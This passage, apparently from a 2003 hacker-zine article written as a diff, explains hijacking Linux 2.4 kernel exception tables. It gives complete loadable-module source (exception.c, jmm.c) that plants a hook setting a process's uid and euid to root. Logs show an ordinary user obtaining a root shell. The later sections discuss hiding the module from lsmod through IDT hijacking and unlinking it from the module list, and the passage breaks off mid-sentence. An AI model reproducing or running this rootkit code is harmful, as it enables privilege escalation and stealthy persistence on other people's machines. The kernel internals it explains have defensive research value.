+ * Thanks to twiz. He suggested to me the idea of searching for
+ * exception table boundaries looking at the kernel module list.
+ */
+
+
+#ifndef __KERNEL__
+#  define __KERNEL__
+#endif
+
+#ifndef MODULE
+#  define MODULE
+#endif
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/init.h>
+#include <linux/smp_lock.h>
+#include <asm/uaccess.h>
+
+
+struct ex_table_entry {
+        unsigned long insn;
+        unsigned long fixup;
+        unsigned long address;
+} ex_table[3];
+
+
+unsigned long addr1 = (unsigned long)__get_user_1;
+unsigned long addr2 = (unsigned long)__get_user_2;
+
+
+static inline struct module *find(void)
+{
+
+        struct module *mp;
+
+        lock_kernel();
+
+        mp = __this_module.next;
+        while(mp->next)
+                mp = mp->next;
+
+        unlock_kernel();
+
+        return mp;
+}
+
+
+static inline void search(struct module *hj)
+{
+
+        unsigned long insn;
+        int           match = 0;
+        int           count = 0;
+
+        for(insn = (unsigned long)hj->ex_table_start; 
+	    insn < (unsigned long)hj->ex_table_end;
+            insn += 2 * sizeof(unsigned long)) {
+
+                if (*(unsigned long *)insn < addr1)
+                        continue;
+
+                if ((*(unsigned long *)insn > addr1) && 
+			(*(unsigned long *)insn < addr2)) {
+                        
+			match++;
+                        count = 0;
+                }
+
+                if (match) {
+                        ex_table[count].address = insn;
+                        ex_table[count].insn = *(unsigned long *)insn;
+                        ex_table[count].fixup = *(unsigned long *)(insn + sizeof(long));
+                        count++;
+                }
+
+                if (count > 2)
+                        break;
+        }
+
+        return;
+}
+
+
+static inline void dump_info(struct module *hj)
+{
+
+        printk(KERN_INFO "__get_user_1 : 0x%lx\n", addr1);
+        printk(KERN_INFO "__get_user_2 : 0x%lx\n", addr2);
+        printk(KERN_INFO "__start___ex_table : 0x%lx\n", 
+		(unsigned long)hj->ex_table_start);
+        printk(KERN_INFO "__end___ex_table   : 0x%lx\n", 
+		(unsigned long)hj->ex_table_end);
+
+        return;
+}
+
+
+static inline void dump_result(struct module *hj)
+{
+
+        int i;
+
+        for (i = 0; i < 3; i++)
+                printk(KERN_INFO "address : 0x%lx insn : 0x%lx fixup : 0xlx\n",
+                       ex_table[i].address, ex_table[i].insn, ex_table[i].fixup);
+
+        return;
+}
+
+
+int exception_init_module(void)
+{
+        struct module *hj;
+
+        hj = find();
+        dump_info(hj);
+
+        if (hj->ex_table_start != NULL )
+                search(hj);
+
+        dump_result(hj);
+
+        return 0;
+}
+
+
+void exception_cleanup_module(void)
+{
+        return;
+}
+
+
+module_init(exception_init_module);
+module_exit(exception_cleanup_module);
+
+MODULE_LICENSE("GPL");
+<-X->
+
+We have to check it...
+
+root@mintaka:~# grep ex_table /boot/System.map
+c028e4f0 A __start___ex_table
+c0290b88 A __stop___ex_table
+root@mintaka:~# grep bad_get_user /boot/System.map
+c0255a44 t bad_get_user
+root@mintaka:~# grep __get_user /boot/System.map
+c02559fc T __get_user_1
+c0255a10 T __get_user_2
+c0255a2c T __get_user_4
+root@mintaka:~# cd /home/buffer/projects
+root@mintaka:/home/buffer/projects# gcc -O2 -Wall -c -I/usr/src/linux/include exception3.c
+root@mintaka:/home/buffer/projects# insmod exception3.o
+root@mintaka:/home/buffer/projects# more /var/log/messages
+[..]
+Oct  3 17:52:57 mintaka kernel: __get_user_1 : 0xc02559fc
+Oct  3 17:52:57 mintaka kernel: __get_user_2 : 0xc0255a10
+Oct  3 17:52:57 mintaka kernel: __start___ex_table : 0xc028e4f0
+Oct  3 17:52:57 mintaka kernel: __end___ex_table   : 0xc0290b88
+Oct  3 17:52:57 mintaka kernel: address : 0xc0290b50 insn : 0xc0255a09
+fixup : 0xc0255a44
+Oct  3 17:52:57 mintaka kernel: address : 0xc0290b58 insn : 0xc0255a22
+fixup : 0xc0255a44
+Oct  3 17:52:57 mintaka kernel: address : 0xc0290b60 insn : 0xc0255a3e
+fixup : 0xc0255a44
+
+That's it, isn't that? Now, in order to readjust exception table we can work
+exactly the same way we worked before. In this case, I'm not showing the code
+since it's only a question of assembling already shown code fragments.
+
+Why should we stop here? Kernel is a module, but it's not the only one...
+
+
+0x09. How to infect modules
+===========================
+
+Now, let's try to invest what we've said till now. To do so, let's have a look
+at search_exception_table() implementation we found before.
+
+
+extern const struct exception_table_entry __start___ex_table[];
+extern const struct exception_table_entry __stop___ex_table[];
+
+static inline unsigned long
+search_one_table(const struct exception_table_entry *first,
+                 const struct exception_table_entry *last,
+                 unsigned long value)
+{
+ 
+       while (first <= last) {
+                const struct exception_table_entry *mid;
+                long diff;
+                mid = (last - first) / 2 + first;
+                diff = mid->insn - value;
+                if (diff == 0)
+                        return mid->fixup;
+                else if (diff < 0)
+                        first = mid+1;
+                else
+                        last = mid-1;
+        }
+        return 0;
+}
+
+extern spinlock_t modlist_lock;
+
+unsigned long
+search_exception_table(unsigned long addr)
+{
+        unsigned long ret = 0;
+#ifndef CONFIG_MODULES
+        /* There is only the kernel to search.  */
+        ret = search_one_table(__start___ex_table, __stop___ex_table-1, addr);
+        return ret;
+#else
+        unsigned long flags;
+        /* The kernel is the last "module" -- no need to treat it special. */
+        struct module *mp;
+        spin_lock_irqsave(&modlist_lock, flags);
+        for (mp = module_list; mp != NULL; mp = mp->next) {
+                if (mp->ex_table_start == NULL ||
+                        !(mp->flags&(MOD_RUNNING|MOD_INITIALIZING)))
+                        continue;
+                ret = search_one_table(mp->ex_table_start,
+                                       mp->ex_table_end - 1, addr);
+                if (ret)
+                        break;
+        }
+        spin_unlock_irqrestore(&modlist_lock, flags);
+        return ret;
+#endif
+}
+
+
+For anyone who isn't used to, this code explains everything we described for
+kernel is also useful for every single module, and comments are quite explicit
+about that.
+
+So we can discover an interesting situation. When a page fault occurs, kernel
+checks every exception table, from the module ones to the kernel one, the last
+to be controlled.
+
+So, if I replace a module exception table with another one containing the entry
+I need, module would go on working correctly and I'd get the same result
+without putting hands on kernel!!!
+
+It's not worth adjusting a module private exception table since it could lead
+to strange and unpredictable system behaviours. It's much better to create a
+new exception table in memory by copying original table all entries, putting at
+the end the ones we need and modifying struct module table referrings, so that
+they'll point to our new version of the table. I'm showing now a code infecting
+all exception tables of the modules in the system that have been already
+insmoded and this code doesn't put hands on kernel. This code returns no logs.
+The only way to verify it effectively works is to insmode and to test his
+effectiveness by using shell.c.
+
+
+<-| pagefault/infect/Makefile |->
+#Comment/uncomment the following line to disable/enable debugging
+#DEBUG = y
+
+CC=gcc
+
+# KERNELDIR can be speficied on the command line or environment
+ifndef KERNELDIR
+        KERNELDIR = /lib/modules/`uname -r`/build
+endif
+
+# The headers are taken from the kernel
+INCLUDEDIR = $(KERNELDIR)/include
+CFLAGS +=  -Wall -D__KERNEL__ -DMODULE -I$(INCLUDEDIR)
+
+ifdef CONFIG_SMP
+        CFLAGS += -D__SMP__ -DSMP
+endif
+
+ifeq ($(DEBUG),y)
+        DEBFLAGS = -O -g -DDEBUG # "-O" is needed to expand inlines
+else
+        DEBFLAGS = -O2
+endif
+
+CFLAGS += $(DEBFLAGS)
+TARGET = exception
+
+all: .depend $(TARGET).o
+
+$(TARGET).o: exception.c
+	$(CC) -c $(CFLAGS) exception.c
+
+clean:
+	rm -f *.o *~ core .depend
+
+depend .depend dep:
+	$(CC) $(CFLAGS) -M *.c > $@
+<-X->
+
+
+<-| pagefault/infect/exception.h |->
+/*
+ * Page Fault Exception Table Hijacking Code - LKM infection version
+ *
+ * Copyright(c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ *
+ * FOR EDUCATIONAL PURPOSES ONLY!!!
+ * I accept absolutely NO RESPONSIBILITY for the entirely stupid (or
+ * illegal) things people may do with this code. If you decide your
+ * life is quite useless and you are searching for some strange kind
+ * of emotions through this code keep in mind it's a your own act
+ * and responsibility is completely yours!
+ */
+
+#ifndef _EXCEPTION_H
+#define _EXCEPTION_H
+
+#undef PDEBUG
+#ifdef DEBUG
+#  define PDEBUG(fmt, args...) printk(KERN_DEBUG fmt, ## args)
+#else
+#  define PDEBUG(fmt, args...) do {} while(0)
+#endif
+
+#undef PDEBUGG
+#define PDEBUGG(fmt, args...) do {} while(0)
+
+
+unsigned long user_1 = (unsigned long)__get_user_1;
+unsigned long user_2 = (unsigned long)__get_user_2;
+struct ex_table_entry *ex_table = NULL;
+
+
+struct module_exception_table {
+        char                          *name;
+        struct module                 *module;
+        struct exception_table_entry  *ex_table_start;
+        struct exception_table_entry  *ex_table_end;
+        struct exception_table_entry  *ex_table_address;
+struct module_exception_table *next;
+};
+
+
+struct ex_table_entry {
+        unsigned long          insn;
+        unsigned long          fixup;
+        unsigned long          address;
+        struct ex_table_entry  *next;
+};
+
+
+static inline unsigned long exception_table_length(struct module *mod)
+{
+        return (unsigned long)((mod->ex_table_end - mod->ex_table_start + 3)
+                               * sizeof(struct exception_table_entry));
+}
+
+
+static inline unsigned long exception_table_bytes(struct module_exception_table *mod)
+{
+        return (unsigned long)((mod->ex_table_end - mod->ex_table_start) *
+                               sizeof(struct exception_table_entry));
+}
+
+#endif /* _EXCEPTION_H */
+<-X->
+
+<-| pagefault/infect/exception.c |->
+/*
+ * Page Fault Exception Table Hijacking Code - LKM infection version
+ *
+ * Copyright(c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ *
+ * FOR EDUCATIONAL PURPOSES ONLY!!!
+ * I accept absolutely NO RESPONSIBILITY for the entirely stupid (or
+ * illegal) things people may do with this code. If you decide your
+ * life is quite useless and you are searching for some strange kind
+ * of emotions through this code keep in mind it's a your own act
+ * and responsibility is completely yours!
+ */
+
+
+/*
+ * Thanks to twiz. He suggested to me the idea of searching for
+ * exception table boundaries looking at the kernel module list.
+ */
+
+
+#ifndef __KERNEL__
+#  define __KERNEL__
+#endif
+
+#ifndef MODULE
+#  define MODULE
+#endif
+
+
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/slab.h>
+#include <linux/init.h>
+#include <linux/smp_lock.h>
+#include <asm/uaccess.h>
+#include "exception.h"
+
+
+struct module_exception_table *mod_extable_head = NULL;
+
+
+void hook(void)
+{
+        current->uid = current->euid = 0;
+}
+
+
+static inline void release_module_extable(struct module_exception_table *mod)
+{
+        if (!mod)
+                return;
+
+        if (mod->name)
+                kfree(mod->name);
+
+        if (mod->ex_table_address)
+                kfree(mod->ex_table_address);
+
+        kfree(mod);
+        mod = NULL;
+}
+
+
+static struct module_exception_table *create_module_extable(struct module *module)
+{
+        struct module_exception_table *mod;
+
+        mod = kmalloc(sizeof(struct module_exception_table), GFP_KERNEL);
+        if (!mod)
+                goto out;
+
+        mod->name = kmalloc(strlen(module->name), GFP_KERNEL);
+        if (!mod->name) {
+                release_module_extable(mod);
+                goto out;
+        }
+
+        strcpy(mod->name, module->name);
+        mod->module = module;
+        mod->ex_table_start = (struct exception_table_entry *)module->ex_table_start;
+        mod->ex_table_end = (struct exception_table_entry *)module->ex_table_end;
+        mod->ex_table_address = kmalloc(exception_table_length(module), GFP_KERNEL);
+        if (!mod->ex_table_address) {
+                release_module_extable(mod);
+                goto out;
+        }
+ out:
+        return mod;
+}
+
+
+static inline void link_module_extable(struct module_exception_table *mod)
+{
+        mod->next = mod_extable_head;
+        mod_extable_head = mod;
+}
+
+
+static inline struct module *scan_modules(void)
+{
+        struct module *mp = __this_module.next;
+        struct module_exception_table *mod;
+
+        while(mp->next) {
+                mod = create_module_extable(mp);
+                if (!mod)
+                        return NULL;
+                link_module_extable(mod);
+                mp = mp->next;
+        }
+
+        return mp;
+}
+
+
+static inline struct ex_table_entry *alloc_extable_entry(unsigned long insn)
+{
+        struct ex_table_entry *entry;
+
+        entry = kmalloc(sizeof(struct ex_table_entry), GFP_KERNEL);
+        if (!entry)
+                goto out;
+
+        entry->address = insn;
+        entry->insn = *(unsigned long *)insn;
+        entry->fixup = *(unsigned long *)(insn + sizeof(unsigned long));
+ out:
+        return entry;
+}
+
+
+static inline void link_extable_entry(struct ex_table_entry *entry)
+{
+        entry->next = ex_table;
+        ex_table = entry;
+}
+
+
+static inline void release_extable(void)
+{
+        struct ex_table_entry *entry = ex_table;
+
+        while(entry) {
+                kfree(entry);
+                entry = entry->next;
+        }
+}
+
+
+static inline int search_kernel_extable(struct module *mp)
+{
+
+        unsigned long insn;
+        int           match = 0;
+        int           count = 0;
+        struct ex_table_entry *entry;
+
+        for(insn = (unsigned long)mp->ex_table_start; insn < (unsigned long)mp->ex_table_end;
+            insn += 2 * sizeof(unsigned long)) {
+
+                if (*(unsigned long *)insn < user_1)
+                        continue;
+                if ((*(unsigned long *)insn > user_1) && (*(unsigned long *)insn < user_2))
+                        match++;
+
+                if (match) {
+                        entry = alloc_extable_entry(insn);
+                        if (!entry) {
+                                release_extable();
+                                return -ENOMEM;
+                        }
+
+                        link_extable_entry(entry);
+                        count++;
+                }
+
+                if (count > 2)
+                        break;
+        }
+
+        return 0;
+}
+
+
+static inline void hijack_exception_table(struct module_exception_table *module,
+                                          unsigned long address)
+{
+        module->module->ex_table_start = module->ex_table_address;
+        module->module->ex_table_end = (struct exception_table_entry *)address;
+}
+
+
+void infect_modules(void)
+{
+        struct module_exception_table *module;
+
+        for(module = mod_extable_head; module != NULL; module = module->next) {
+                int len = exception_table_bytes(module);
+                unsigned long address = (unsigned long)module->ex_table_address + len;
+                struct ex_table_entry *entry;
+
+                if (module->ex_table_start)
+                        memcpy(module->ex_table_address, module->ex_table_start, len);
+
+                for (entry = ex_table; entry; entry = entry->next) {
+                        memcpy((void *)address, &entry->insn, sizeof(unsigned long));
+                        *(unsigned long *)(address + sizeof(unsigned long))
+                                = (unsigned long)hook;
+
+                        address += 2 * sizeof(unsigned long);
+                }
+
+                hijack_exception_table(module, address);
+        }
+}
+
+
+static inline void resume_exception_table(struct module_exception_table *module)
+{
+        module->module->ex_table_start = module->ex_table_start;
+        module->module->ex_table_end = module->ex_table_end;
+}
+
+
+void exception_cleanup_module(void)
+{
+        struct module_exception_table *module;
+
+        lock_kernel();
+
+        for(module = mod_extable_head; module != NULL; module = module->next) {
+                resume_exception_table(module);
+                release_module_extable(module);
+        }
+
+        unlock_kernel();
+        return;
+}
+
+
+int exception_init_module(void)
+{
+        struct module *mp;
+
+        lock_kernel();
+
+        mp = scan_modules();
+        if (!mp)
+                goto out;
+        if (search_kernel_extable(mp))
+                goto out;
+        infect_modules();
+
+        unlock_kernel();
+        return 0;
+ out:
+        exception_cleanup_module();
+        return -ENOMEM;
+}
+
+
+module_init(exception_init_module);
+module_exit(exception_cleanup_module);
+MODULE_LICENSE("GPL");
+<-X->
+
+
+Let's have a try to be complete...
+
+
+root@mintaka:/home/buffer/projects# insmod exception.o
+buffer@mintaka:~/projects$ id
+uid=1000(buffer) gid=100(users) groups=100(users),104(cdrecording)
+buffer@mintaka:~/projects$ ./shell
+result = -788176896 errno = 0
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=100(users),104(cdrecording)
+sh-2.05b#
+
+It looks like it's working, but I'm not completely satisfied yet...
+
+
+0x0a. Moving towards darkness
+=============================
+
+The code I showed before is complete and perfectly running, but if we think
+about it for a few while we can understand this approach can go to extremes if
+we just want it to.
+
+For example, we can just led module to infect its own exception table to get
+the same result... without even putting hands on modules!!!
+
+This idea came to me while I was thinking about a countermove for the fore
+presented module. In fact, I was thinking about introducing a control like that
+one in AngeL. If I insmode my control code, I could think about saving a kernel
+and insmoded modules exception tables copy.
+Then, by writing a wrapper for sys_create_module(), which is recalled when a
+module is insmoded, we could implement a control that checks if there's any
+addition to exception table... theoretically is good, practically isn't too
+much.
+
+The main problem is module list is only a linked one and list top is a non
+exported symbol.
+
+What does it mean for practicing it? It simply means my control module can only
+have access to modules that have been insmoded before it has starting by
+__this_module.next . A module insmoded immediately after it is not accessible
+by it unless we don't invent some strange process to find out list top.
+
+If we reason this way, it's stupid to infect all modules since we would allow
+this imaginary control module to understand what's going on. Actually infecting
+a single module is enough. After this, the easiest thing to do is writing a
+self-infecting module...
+ 
+I wrote this new code version that, during a creative outburst, I called jmm,
+meaning Just My Module... I know it's silly, but please accept it at now...
+
+
+<-| pagefault/jmm/Makefile |->
+#Comment/uncomment the following line to disable/enable debugging
+#DEBUG = y
+
+CC=gcc
+
+# KERNELDIR can be speficied on the command line or environment
+ifndef KERNELDIR
+        KERNELDIR = /lib/modules/`uname -r`/build
+endif
+
+# The headers are taken from the kernel
+INCLUDEDIR = $(KERNELDIR)/include
+CFLAGS +=  -Wall -D__KERNEL__ -DMODULE -I$(INCLUDEDIR)
+
+ifdef CONFIG_SMP
+        CFLAGS += -D__SMP__ -DSMP
+endif
+
+ifeq ($(DEBUG),y)
+        DEBFLAGS = -O -g -DDEBUG # "-O" is needed to expand inlines
+else
+        DEBFLAGS = -O2
+endif
+
+CFLAGS += $(DEBFLAGS)
+TARGET = jmm
+
+all: .depend $(TARGET).o
+
+$(TARGET).o: jmm.c
+	$(CC) -c $(CFLAGS) jmm.c
+
+clean:
+	rm -f *.o *~ core .depend
+
+depend .depend dep:
+	$(CC) $(CFLAGS) -M *.c > $@
+<-X->
+
+
+<-| pagefault/jmm/jmm.c |->
+/*
+ * Page Fault Exception Table Hijacking Code - autoinfecting LKM version
+ *
+ * Copyright(c) 2003 Angelo Dell'Aera <buffer@antifork.org>
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; either version 2 of the License, or
+ * (at your option) any later version.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License
+ * along with this program; if not, write to the Free Software
+ * Foundation, Inc., 59 Temple Place, Suite 330, Boston,
+ * MA  02111-1307  USA
+ *
+ * FOR EDUCATIONAL PURPOSES ONLY!!!
+ * I accept absolutely NO RESPONSIBILITY for the entirely stupid (or
+ * illegal) things people may do with this code. If you decide your
+ * life is quite useless and you are searching for some strange kind
+ * of emotions through this code keep in mind it's a your own act
+ * and responsibility is completely yours!
+ */
+
+
+#ifndef __KERNEL__
+#  define __KERNEL__
+#endif
+
+#ifndef MODULE
+#  define MODULE
+#endif
+
+#include <linux/kernel.h>
+#include <linux/module.h>
+#include <linux/init.h>
+#include <linux/slab.h>
+#include <linux/smp_lock.h>
+#include <asm/uaccess.h>
+
+struct ex_table_entry {
+        unsigned long insn;
+        unsigned long fixup;
+        unsigned long address;
+} ex_table[3];
+
+unsigned long addr1 = (unsigned long)__get_user_1;
+unsigned long addr2 = (unsigned long)__get_user_2;
+unsigned long address;
+
+struct exception_table_entry *ex_table_start;
+struct exception_table_entry *ex_table_end;
+struct module *kernel_module_address;
+
+
+void hook(void)
+{
+        current->uid = current->euid = 0;
+}
+
+
+static inline struct module *find_kernel(void)
+{
+        struct module *mp;
+
+        lock_kernel();
+        mp = __this_module.next;
+        while(mp->next)
+                mp = mp->next;
+        unlock_kernel();
+
+        return mp;
+}
+
+
+static inline void search(struct module *hj)
+{
+        unsigned long insn;
+        int           match = 0;
+        int           count = 0;
+
+        for(insn = (unsigned long)hj->ex_table_start; insn < (unsigned long)hj->ex_table_end;
+            insn += 2 * sizeof(unsigned long)) {
+                if (*(unsigned long *)insn < addr1)
+                        continue;
+                if ((*(unsigned long *)insn > addr1) && (*(unsigned long *)insn < addr2)) {
+                        match++;
+                        count = 0;
+                }
+
+                if (match) {
+                        ex_table[count].address = insn;
+                        ex_table[count].insn = *(unsigned long *)insn;
+                        ex_table[count].fixup = *(unsigned long *)(insn + sizeof(long));
+                        count++;
+                }
+
+                if (count > 2)
+                        break;
+        }
+        return;
+}
+
+static inline unsigned long exception_table_bytes(void)
+{
+        return (unsigned long)((ex_table_end - ex_table_start) *
+                               sizeof(struct exception_table_entry));
+}
+
+
+static inline void clone_ex_table(void)
+{
+        memcpy((void *)address, (void *)ex_table_start, exception_table_bytes());
+}
+
+
+static inline unsigned long exception_table_length(void)
+{
+        return (unsigned long)((ex_table_end - ex_table_start + 3)
+                               * sizeof(struct exception_table_entry));
+}
+
+static inline void extend_ex_table()
+{
+        int i;
+        int len = exception_table_bytes();
+        unsigned long addr = address + len;
+
+        for(i = 0; i < 3; i++) {
+                memcpy((void *)addr, &ex_table[i].insn, sizeof(unsigned long));
+                *(unsigned long *)(addr + sizeof(unsigned long)) = (unsigned long)hook;
+                addr += 2 * sizeof(unsigned long);
+        }
+}
+
+static inline void hijack_module(void)
+{
+        __this_module.ex_table_start = (struct exception_table_entry *)address;
+        __this_module.ex_table_end = (struct exception_table_entry *)(address + exception_table_length());
+}
+
+static inline void resume_module(void)
+{
+        __this_module.ex_table_start = ex_table_start;
+        __this_module.ex_table_end = ex_table_end;
+        kfree((void *)address);
+}
+
+static inline int infect(void)
+{
+        address = (unsigned long)kmalloc(exception_table_length(), GFP_KERNEL);
+        if (!address)
+                return -ENOMEM;
+        memset((void *)address, 0, exception_table_length());
+        clone_ex_table();
+        extend_ex_table();
+        hijack_module();
+        return 0;
+}
+
+
+static inline struct module *prepare_to_infect(void)
+{
+        ex_table_start = (struct exception_table_entry *)__this_module.ex_table_start;
+        ex_table_end = (struct exception_table_entry *)__this_module.ex_table_end;
+
+        kernel_module_address = find_kernel();
+
+        if (!kernel_module_address)
+                goto out;
+
+        search(kernel_module_address);
+ out:
+        return kernel_module_address;
+}
+
+static void jmm_cleanup(void)
+{
+        resume_module();
+        return;
+}
+
+static int jmm_init(void)
+{
+        int ret = -ENODEV;
+
+        if (!prepare_to_infect())
+                goto out;
+        ret = infect();
+ out:
+        return ret;
+}
+
+module_init(jmm_init);
+module_exit(jmm_cleanup);
+MODULE_LICENSE("GPL");
+<-X->
+
+
+Do you need a test?
+
+
+root@mintaka:/home/buffer/projects/pagefault/jmm# make
+gcc -Wall -D__KERNEL__ -DMODULE -I/lib/modules/`uname -r`/build/include -O2 -M *.c > .depend
+gcc -c -Wall -D__KERNEL__ -DMODULE -I/lib/modules/`uname -r`/build/include -O2 jmm.c
+root@mintaka:/home/buffer/projects/pagefault/jmm# insmod jmm.o
+root@mintaka:/home/buffer/projects/pagefault/jmm#
+
+buffer@mintaka:~/projects/pagefault/test$ id
+uid=1000(buffer) gid=100(users) groups=100(users),104(cdrecording)
+buffer@mintaka:~/projects/pagefault/test$ ./shell
+result = -776749056 errno = 0
+sh-2.05b# id
+uid=0(root) gid=100(users) groups=100(users),104(cdrecording)
+sh-2.05b#
+
+
+And this is done, too!
+
+
+0x0b. Unsecured ideas
+=====================
+
+All material I introduced till now has a severe problem, and we just need to
+launch a lsmod to realize it. Our nice module will be highlighted among the
+list... and I should say it's no good! Yet, at this point during our healthy
+stroll into kernel we know very well our purposes and how to get them. An idea
+that came to me is the following one. Just think about infecting your module
+and separating it from the module list, but keeping a trace of it in one way or
+another (for example, by a trivial struct module pointer). Now the module will
+disappear from the list.
+
+This way, though, it would be useless, since, while searching into modules
+exception tables, it wouldn't be considered. Now, let's suppose to find a way
+to relink module if a page fault occurs. A trivial way could be Interrupt
+Descriptor Table hijacking by redirecting page fault handler to your code as I
+said in [7]. Perhaps it's the least stealth way to get it, but let's just try
+to understand the idea.
+
+What happens now? Nobody is now able to see this module because of own kernel
+implementation. It is necessary to make a few considerations about kernel
+design to understand that.
+
+2.4 kernel by Linux is a non-preemptible one. This means there can be only a
+process in kernel mode at any time and it can be preempted by no other process
+unless it doesn't release CPU on its own, for example by summoning schedule().
+
+Situation is completely different if who tries to interrupt process being
+executed in kernel mode is an interrupt. In fact, in this case process will be
+preempted by Interrupt Service Routine that usually executes top half handler,
+in which it schedules bottom half handler before exiting.
+
+Now, let's think about our case. If we think of working on a monoprocessor
+architecture there are no important problems since a page fault can only be
+caused by a running process. Then page fault handler execution will start and
+it will preempt running process. Usually in these cases page fault is managed
+and so preempted process which causes page fault will be executed again. Thus
+is impossible to understand what happens during page fault handler execution.
+
+Now, let's try to think what would happen in a SMP architecture. Let's suppose
+a CPU to schedule lsmod process, and at the same time us to force another CPU
+page fault, for example by previously examined code.
+
+Question: "Will lsmod see the module?"
+Answer: "Of course it won't, if we know how to avoid it!"
+
+Let's try to understand it step by step by analyzing code and let's try to
+understand what kind of operations lsmod(8) accomplishes. To do that, we launch
+a `strace lsmod'. This is output most interesting part
+
+
+query_module(NULL, 0, NULL, 0)          = 0
+query_module(NULL, QM_MODULES, { /* 20 entries */ }, 20) = 0
+query_module("iptable_nat", QM_INFO, {address=0xe2a8d000, size=16760, 
+flags=MOD_RUNNING|MOD_AUTOCLEAN|MOD_VISITED|MOD_USED_ONCE, usecount=1}, 16) = 0
+query_module("iptable_nat", QM_REFS, { /* 1 entries */ }, 1) = 0
+[...]
+
+
+Ok, we have the first important information. To get information about lsmod(8)
+modules it summons sys_query_module(). I suggest everyone doesn't know this
+syscall to read query_module(2) man page.
+
+Let's examine code fragment which is interesting to us in kernel/module.c.
+
+
+asmlinkage long
+sys_query_module(const char *name_user, int which, char *buf, size_t bufsize,
+                 size_t *ret)
+{
+        struct module *mod;
+        int err;
+
+        lock_kernel();
+
+	[..]
+
+        unlock_kernel();
+        return err;
+}
+
+
+We remark sys_query_module() uses a big giant lock obtained through
+lock_kernel() and released after the exiting through unlock_kernel(). I think
+that's not very nice at sight, but that's it.
+
+Thus, sys_query_module() obtains big kernel lock for its own execution to let
+modules list to be coherent. Let's try to understand how this antediluvian
+device also named big giant lock works. Big giant lock was created during 2.0
+kernel period. In fact, when you still were babes in arms, someone was
+starting talking about SMP architectures and Linus, always foreseeing future,
+thought that, in spite of during 2.0 kernel period it was difficult to find a
+SMP machine, his kernel should have been able to run also on those machines,
+though they didn't exist yet... and IMHO this is the reason for designing big
+giant lock... that is a real rip-off! Of course, you won't tell that SMPng
+constructors, that have understood that just a few months ago...
+
+The idea laying under big giant lock is quite simple. It's a spinlock shared by
+all CPUs. When a CPU obtains it the other ones can't run kernel mode processes.
+That's all. Of course, benchmarks were shitty, but code was running and many
+race condition and deadlocks were not used.
+
+In 2.2 kernel period, big giant lock importance began lessening, that is
+specific spinlocks defending specific resources were introduced and this
+tendency has been enhanced in 2.4 kernel.
+
+Be careful about that as, though I'm keeping it very easy and novel-looking
+like, it's not trivial to delete big giant lock needing and introducing a
+spinlock per resource in some situations.
+
+In fact, some kernel sections still use it to avoid at any cost deadlocks not
+good even on operating systems theory books, try to imagine them in practice!
+
+A few more words about big giant lock, by commenting code that implements it in
+2.4.23 kernel.
+
+
+static __inline__ void lock_kernel(void)
+{
+#if 1
+        if (!++current->lock_depth)
+                spin_lock(&kernel_flag);
+#else
+        __asm__ __volatile__(
+                "incl %1\n\t"
+                "jne 9f"
+                spin_lock_string
+                "\n9:"
+                :"=m" (__dummy_lock(&kernel_flag)),
+                 "=m" (current->lock_depth));
+#endif
+}
+
+static __inline__ void unlock_kernel(void)
+{
+        if (current->lock_depth < 0)
+                out_of_line_bug();
+#if 1
+        if (--current->lock_depth < 0)
+                spin_unlock(&kernel_flag);
+#else
+        __asm__ __volatile__(
+                "decl %1\n\t"
+                "jns 9f\n\t"
+                spin_unlock_string
+                "\n9:"
+                :"=m" (__dummy_lock(&kernel_flag)),
+                 "=m" (current->lock_depth));
+#endif
+}
+
+
+There is a kernel_flag spinlock, that is in all respects a big giant lock. Note
+that, if a process tries to obtain big giant lock, it increases its (referred
+to process lock_depth, a process private resource) lock_depth by 1, and its
+initial value is -1. After first lock_depth increase, its value will be 0 and
+only now process will try to obtain spinlock.
+After following lock_kernel() summonings, lock_depth() will be the only one to
+be increased. We aren't talking about lock_depth() relevance, but its role is
+extremely important since it lets you understand how many times a process has
+tried to obtain spinlock. This designs allows you avoiding deadlocks. In fact,
+if we suppose to run next code fragment
+
+
+	spin_lock(&lock);
+	[instructions]
+	spin_lock(&lock);
+
+
+Unless another genius (you would be the first one if you do that) hasn't hung
+on another CPU scheduled kernel path a spin_unlock(&lock) there's only a
+possible conclusion... deadlock!
+
+In fact, second calling to spin_lock() can't obtain spinlock lock and thus it
+starts "spinning around" waiting for lock to be released... but it will never
+be! Let's try to see what happens if we use lock_kernel().
+
+
+	lock_kernel();
+        [instructions]
+        lock_kernel();
+
+
+Only the first lock_kernel() summons spin_lock(&kernel_flag). Next call will
+find lock_depth value as 0, will set it 1 and will not call spin_lock()...
+Then, summing up, lock_kernel() can be called several times even by kernel
+path without causing any problem.
+
+Don't forget we want module to be added to list when we get in page fault
+handler and to be removed when we get out.
+
+Now, what if kernel manages a page fault? Will we obtain big giant lock? Of
+course we won't. Thus, if I launch lsmod there's a chance, though very little,
+that, while modules are being listed, handler, because of a page fault, adds in
+the list our module on another CPU and lsmod is able to see it. Of course, we
